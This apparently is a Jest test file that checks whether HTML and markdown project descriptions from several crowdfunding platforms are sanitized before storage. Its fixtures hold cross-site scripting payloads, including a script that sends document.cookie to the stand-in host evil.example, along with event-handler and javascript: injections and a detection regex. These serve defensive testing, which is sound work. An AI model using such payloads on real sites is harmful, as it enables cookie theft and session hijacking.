import {
  afterAll,
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  jest,
  test,
} from "@jest/globals";
import { EntityManager } from "typeorm";
import { closeConnection, deleteAll, getTestEntityManager } from "./utils";
import { Project } from "../model";
import { updateOrCreateProject } from "../features/import-projects/helpers";
import { processProjectsBatch as processGitcoinBatch } from "../features/import-projects/gitcoin/helpers";
import { processProjectsBatch as processGardensBatch } from "../features/import-projects/gardens/helpers";
import { processProjectsBatch as processGivethBatch } from "../features/import-projects/giveth/helpers";
import { saveBatchProjects as saveRfBatch } from "../features/import-projects/rf/helpers";
import { gitcoinSourceConfig } from "../features/import-projects/gitcoin/constants";
import { gardensSourceConfig } from "../features/import-projects/gardens/constants";
import { givethSourceConfig } from "../features/import-projects/giveth/constants";
import { rfSourceConfig } from "../features/import-projects/rf/constants";
import { rlSourceConfig } from "../features/import-projects/retroList/constants";
import { rpgf3SourceConfig } from "../features/import-projects/rpgf/constants";

// What an attacker controls: the description text of a project registered on
// a source platform. Written as markdown with HTML mixed in, which is what
// Gitcoin and Gardens hand to the markdown converter.
const HOSTILE_MARKDOWN = [
  "# Our project",
  "",
  "We build **public goods**. [Docs](https://example.com/docs)",
  "",
  '<img src=x onerror="alert(document.domain)">',
  "",
  "<script>fetch('https://evil.example/' + document.cookie)</script>",
  "",
  '<a href="javascript:alert(1)" onclick="alert(2)">claim</a>',
  "",
  '<iframe src="https://evil.example/phish"></iframe>',
  "",
  "<svg onload=alert(3)></svg>",
].join("\n");

const HOSTILE_HTML =
  '<h2 onmouseover="alert(1)">About</h2>' +
  '<p class="ql-indent-1" style="text-align: center; position: fixed">We <strong>build</strong>.</p>' +
  "<script>alert(1)</script>" +
  '<img src="https://example.com/a.png" onerror="alert(1)">' +
  '<a href="javascript:alert(1)">claim</a>' +
  '<iframe src="https://evil.example/phish"></iframe>' +
  '<iframe class="ql-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"></iframe>';

const expectNoExecutableMarkup = (html: string | null | undefined) => {
  expect(html).toBeTruthy();
  expect(html).not.toMatch(/<script|<svg|javascript:|evil\.example/i);
  expect(html).not.toMatch(/<[^>]*\son[a-z]+\s*=/i);
};

let em: EntityManager;
const stored = (id: string) =>
  em.getRepository(Project).findOneByOrFail({ id });

beforeAll(async () => {
  em = await getTestEntityManager();
});
afterAll(async () => {
  await closeConnection();
});
beforeEach(async () => {
  await deleteAll(em, Project);
});
afterEach(() => {
  jest.restoreAllMocks();
});

describe("descriptions are sanitized before they are stored", () => {
  test("gitcoin: markdown is converted, then sanitized", async () => {
    const tally = await processGitcoinBatch([
      {
        id: "0xGitcoin1",
        name: "Gitcoin project",
        metadata: {
          type: "project",
          description: HOSTILE_MARKDOWN,
          createdAt: 1700000000000,
        },
      } as any,
    ]);
    expect(tally.written).toBe(1);

    const project = await stored("gitcoin-0xgitcoin1");
    expectNoExecutableMarkup(project.descriptionHtml);
    expect(project.descriptionHtml).toContain("<h1>Our project</h1>");
    expect(project.descriptionHtml).toContain("<strong>public goods</strong>");
    expect(project.descriptionHtml).toContain(
      '<a href="https://example.com/docs" target="_blank" rel="noopener noreferrer nofollow">Docs</a>'
    );
    expect(project.descriptionHtml).not.toContain("<iframe");
    // The markdown source is text, kept exactly as the platform served it.
    expect(project.description).toBe(HOSTILE_MARKDOWN);
    expect(project.descriptionSummary).toContain("We build public goods.");
    expect(project.descriptionSummary).not.toMatch(/<|alert|evil\.example/);
  });

  test("gardens: the IPFS covenant is converted, then sanitized", async () => {
    jest.spyOn(globalThis, "fetch").mockResolvedValue(
      new Response(JSON.stringify({ covenant: HOSTILE_MARKDOWN }), {
        headers: { "content-type": "application/json" },
      })
    );
    const tally = await processGardensBatch([
      {
        id: "0xGarden1",
        chainId: 10,
        communityName: "Garden",
        covenantIpfsHash: "QmHash",
        registerToken: "0xtoken",
      },
    ]);
    expect(tally.written).toBe(1);

    const project = await stored("gardens-0xgarden1");
    expectNoExecutableMarkup(project.descriptionHtml);
    expect(project.descriptionHtml).toContain("<h1>Our project</h1>");
    expect(project.description).toBe(HOSTILE_MARKDOWN);
  });

  test("gardens: a covenant that is not a string cannot carry markup either", async () => {
    jest.spyOn(globalThis, "fetch").mockResolvedValue(
      new Response(
        JSON.stringify({
          covenant: { text: "<img src=x onerror=alert(1)>" },
        }),
        { headers: { "content-type": "application/json" } }
      )
    );
    await processGardensBatch([
      { id: "0xGarden2", chainId: 10, covenantIpfsHash: "QmHash" },
    ]);
    const project = await stored("gardens-0xgarden2");
    expect(project.descriptionHtml).not.toMatch(/onerror/i);
  });

  test("giveth: the editor HTML in `description` is sanitized", async () => {
    const tally = await processGivethBatch([
      {
        id: "77",
        title: "Giveth project",
        description: HOSTILE_HTML,
        slug: "giveth-project",
        image: null,
        creationDate: "2026-01-01T00:00:00.000Z",
      },
    ]);
    expect(tally.written).toBe(1);

    const project = await stored("giveth-77");
    expectNoExecutableMarkup(project.description);
    expect(project.description).toContain("<h2>About</h2>");
    expect(project.description).toContain(
      '<p class="ql-indent-1" style="text-align:center">We <strong>build</strong>.</p>'
    );
    expect(project.description).toContain(
      '<img src="https://example.com/a.png" />'
    );
    // The video embed is kept, rebuilt from its id; the other frame is gone.
    expect(project.description).toContain(
      'src="https://www.youtube.com/embed/dQw4w9WgXcQ"'
    );
    expect(project.description!.match(/<iframe/g)).toHaveLength(1);
    expect(project.descriptionHtml).toBeNull();
    expect(project.descriptionSummary).toContain("We build.");
    expect(project.descriptionSummary).not.toContain("alert");
  });

  test("giveth: a project without a description stays without one", async () => {
    await processGivethBatch([
      {
        id: "78",
        title: "Empty",
        description: null,
        slug: "empty",
        image: null,
        creationDate: "2026-01-01T00:00:00.000Z",
      },
    ]);
    const project = await stored("giveth-78");
    expect(project.description).toBeNull();
    expect(project.descriptionHtml).toBeNull();
  });

  // These sources publish plain text. It is stored as text - never converted
  // into markup - and no HTML field is produced from it.
  const TEXT = 'Impact: a < b && c > d. See <script>alert(1)</script> "docs"';

  test("retro funding: plain text is stored verbatim, with no HTML field", async () => {
    const tally = await saveRfBatch(
      [{ id: "0xRf1", name: "RF project", description: TEXT } as any],
      4
    );
    expect(tally.written).toBe(1);
    const project = await stored("rf-0xrf1");
    expect(project.description).toBe(TEXT);
    expect(project.descriptionHtml).toBeNull();
  });

  test("retroList and rpgf3: plain text is stored verbatim, with no HTML field", async () => {
    await updateOrCreateProject(
      {
        id: "0xRl1",
        name: "RL",
        description: TEXT,
        prelimResult: "Keep",
        rfRound: 5,
      },
      rlSourceConfig
    );
    await updateOrCreateProject(
      { RPGF3Id: "0xRpgf1", name: "RPGF", impactDescription: TEXT },
      rpgf3SourceConfig
    );
    for (const id of ["rf-0xrl1", "rpgf3-0xrpgf1"]) {
      const project = await stored(id);
      expect(project.description).toBe(TEXT);
      expect(project.descriptionHtml).toBeNull();
    }
  });

  test("no source can store an HTML field that was not sanitized", async () => {
    const configs = [
      gitcoinSourceConfig,
      gardensSourceConfig,
      givethSourceConfig,
      rfSourceConfig,
      rlSourceConfig,
      rpgf3SourceConfig,
    ];
    let n = 0;
    for (const config of configs) {
      // Even a source that is not expected to send HTML is covered, should a
      // configuration ever name an HTML field for it.
      const withHtmlField = { ...config, descriptionHtmlField: "html" };
      const id = `p${n++}`;
      const outcome = await updateOrCreateProject(
        {
          [config.idField]: id,
          [config.titleField]: "t",
          [config.descriptionField]: "text",
          html: HOSTILE_HTML,
          prelimResult: "Keep",
        },
        withHtmlField
      );
      expect(outcome).toBe("created");
      const project = await stored(`${config.source}-${id}`);
      expectNoExecutableMarkup(project.descriptionHtml);
    }
  });
});

describe("rows stored before sanitization", () => {
  const gitcoinProject = {
    id: "0xLegacy",
    name: "Legacy",
    metadata: {
      type: "project",
      description: HOSTILE_MARKDOWN,
      createdAt: 1700000000000,
    },
  } as any;

  test("the next import rewrites them, and then leaves them alone", async () => {
    await processGitcoinBatch([gitcoinProject]);
    const clean = (await stored("gitcoin-0xlegacy")).descriptionHtml;

    // Put the row back to what the importer used to write.
    await em
      .getRepository(Project)
      .update(
        { id: "gitcoin-0xlegacy" },
        { descriptionHtml: '<p>old</p><img src=x onerror="alert(1)">' }
      );

    expect(await processGitcoinBatch([gitcoinProject])).toMatchObject({
      written: 1,
      unchanged: 0,
    });
    expect((await stored("gitcoin-0xlegacy")).descriptionHtml).toBe(clean);

    // Sanitized output compares equal to the stored value: no further write.
    expect(await processGitcoinBatch([gitcoinProject])).toMatchObject({
      written: 0,
      unchanged: 1,
    });
  });

  test("a giveth row is rewritten once, then reported unchanged", async () => {
    const project = {
      id: "90",
      title: "Legacy giveth",
      description: HOSTILE_HTML,
      url: "/project/legacy",
      image: null,
      creationDate: "2026-01-01T00:00:00.000Z",
    };
    expect(await updateOrCreateProject(project, givethSourceConfig)).toBe(
      "created"
    );
    await em
      .getRepository(Project)
      .update({ id: "giveth-90" }, { description: HOSTILE_HTML });

    expect(await updateOrCreateProject(project, givethSourceConfig)).toBe(
      "updated"
    );
    expectNoExecutableMarkup((await stored("giveth-90")).description);
    expect(await updateOrCreateProject(project, givethSourceConfig)).toBe(
      "unchanged"
    );
  });
});
